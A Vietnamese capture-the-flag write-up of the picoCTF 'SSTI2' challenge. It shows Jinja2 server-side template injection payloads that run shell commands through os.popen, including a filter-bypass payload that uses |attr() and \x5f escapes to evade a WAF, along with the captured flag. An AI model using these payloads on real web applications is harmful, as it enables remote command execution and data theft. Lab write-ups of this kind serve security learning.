# SSTI2
Giống như bài SSTI1, bài này cũng là 1 bài khai thác lỗ hổng SSTI.

![alt text](image.png)

SSTI (Server-Side Template Injection) là một lổ hổng web xảy ra khi kẻ tấn công có thể chèn đầu vào độc hại vào công cụ mẫu của ứng dụng web.

Ta thử nghiệm payload:

``` python 
{{7*7}}
```

Và kết quả là:

![alt text](image-1.png)

Template engine đang được sử dụng là `Jinja2` giống như bài SSTI1.

Tiếp tục nhập thử `payload` khai thác SSTI sau (giống như ở bài SSTI1):

``` python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

Và kết quả là:

![alt text](image-2.png)

Có vẻ như trang web đã chặn hoạt động của `payload` cũ. Giờ ta cần một `payload` khác không bị chặn bởi trang web.

Tra cứu một chút, ta nhận được một số thông tin sau:

- Sử đụng `|attr()` để thay thế kí hiệu dấu `.`
- Sử dụng `\x5f` để thay thế cho dấu gạch dưới
- Sử dụng `__getitem__()` để 
WAF (Web Application Firewall) không tìm thấy chuỗi `builtins` và `import`.

``` python 
{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('cat flag')|attr('read')()}}
```

Sử dụng payload trên và ta có flag:

``` 
picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
```